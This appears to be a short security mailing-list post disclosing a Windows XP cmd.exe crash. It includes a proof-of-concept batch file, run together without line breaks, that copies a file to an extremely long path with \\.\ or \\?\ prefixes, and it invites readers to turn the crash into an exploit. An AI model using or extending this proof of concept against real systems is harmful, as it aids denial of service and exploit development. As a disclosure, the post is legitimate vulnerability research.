Subject: Windows XP cmd.exe crash

Ey list! Just something quick and funny crash I found long time ago and it may give some of you something to check this weekend.
Windows XP cmd.exe crash when trying to copy files with a very long name. The following BATCH file can crash the cmd.exe process:
----------------------------------- crash.bat --------------------------------------@...o offecho test > data.txtcopy "%CD%"\data.txt \\.\C:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.txtREM copy "%CD%"\data.txt \\?\C:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.txt---------------------------------- / crash.bat ----------------------------------------
It only happens with "copy" but not with "move" command and with both \\.\ and \\?\ prefixes. I'm not an expert on these fields so I don't know if it will be possible to exploit it, maybe some of you with crazy kung fu skills can do it. If not, it's just a weird behaviour for the cmd.exe and given that is less than a year to the end of life of the Windows XP cannot see any harm sharing it.
Ta!
